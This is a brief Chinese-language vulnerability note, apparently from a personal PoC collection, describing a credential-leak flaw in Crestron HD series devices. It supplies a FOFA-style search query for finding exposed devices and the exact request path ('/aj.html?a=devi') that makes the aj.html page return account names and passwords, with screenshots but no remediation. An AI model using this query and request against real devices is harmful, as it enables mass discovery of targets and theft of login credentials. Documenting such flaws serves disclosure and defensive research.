# CrestronHD aj.html存在账号密码泄漏漏洞

### 一、漏洞描述
Crestron HD等系列设备 aj.html页面调用特定的参数可以获取账号密码等敏感信息

### 二、影响版本
<font style="color:#000000;">Crestron HD</font>

### 三、资产测绘
```plain
app="Crestron-HD-RX-201-C-E"
```

![1721629595136-6f0f4040-d481-492a-8494-dea2c83b1283.png](./img/PPvFl06oFahLD99Q/1721629595136-6f0f4040-d481-492a-8494-dea2c83b1283-902289.png)

### 四、漏洞复现
```plain
/aj.html?a=devi
```

![1721629619502-e589e5fa-400d-4d2f-b3b2-9c9af3fc7958.png](./img/PPvFl06oFahLD99Q/1721629619502-e589e5fa-400d-4d2f-b3b2-9c9af3fc7958-894426.png)



> 更新: 2024-08-12 17:48:53  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/cdvmx13vg4wd8fyr>